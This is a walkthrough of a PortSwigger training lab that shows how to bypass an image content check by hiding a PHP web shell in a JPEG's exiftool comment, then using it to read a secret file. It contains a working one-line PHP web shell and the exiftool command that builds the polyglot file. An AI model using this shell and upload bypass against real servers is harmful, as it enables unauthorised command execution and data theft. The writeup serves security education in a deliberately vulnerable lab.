# Remote code execution via polyglot web shell upload

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload), you'll learn: Remote code execution via polyglot web shell upload! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-6/images/Pasted%20image%2020221216025436.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-6/images/Pasted%20image%2020221216025453.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-6/images/Pasted%20image%2020221216025501.png)

In previous labs, we found the image upload function is vulnerable.

**Let's try to upload a PHP web shell:**
```php
<?php system($_GET['cmd']); ?>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-6/images/Pasted%20image%2020221216025921.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-6/images/Pasted%20image%2020221216025934.png)

However, it rejects because our uploaded file is not a valid image.

**To bypass this, we can upload a polyglot file.**

Polyglot is a valid form of multiple different file types.

**Now, we can use `exiftool` to add "comment", which is the PHP web shell code!**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-6]
└─# exiftool -Comment='<?php system($_GET["cmd"]); ?>' exploit.jpg -o exploit.php
```

> Note: The `jpg` image must be a valid image file.

**Then, you can use `exiftool <output_filename>` to verify it:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-6]
└─# exiftool info exploit.php                                                    
[...]
Comment                         : <?php system($_GET["cmd"]); ?>
[...]
```

**After that, we can upload our web shell!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-6/images/Pasted%20image%2020221216031313.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-6/images/Pasted%20image%2020221216031323.png)

**It worked! Let's try can we execute any code:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-6/images/Pasted%20image%2020221216031513.png)

**Nice! Let's `cat` the `secret` file:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-6/images/Pasted%20image%2020221216031542.png)

# What we've learned:

1. Remote code execution via polyglot web shell upload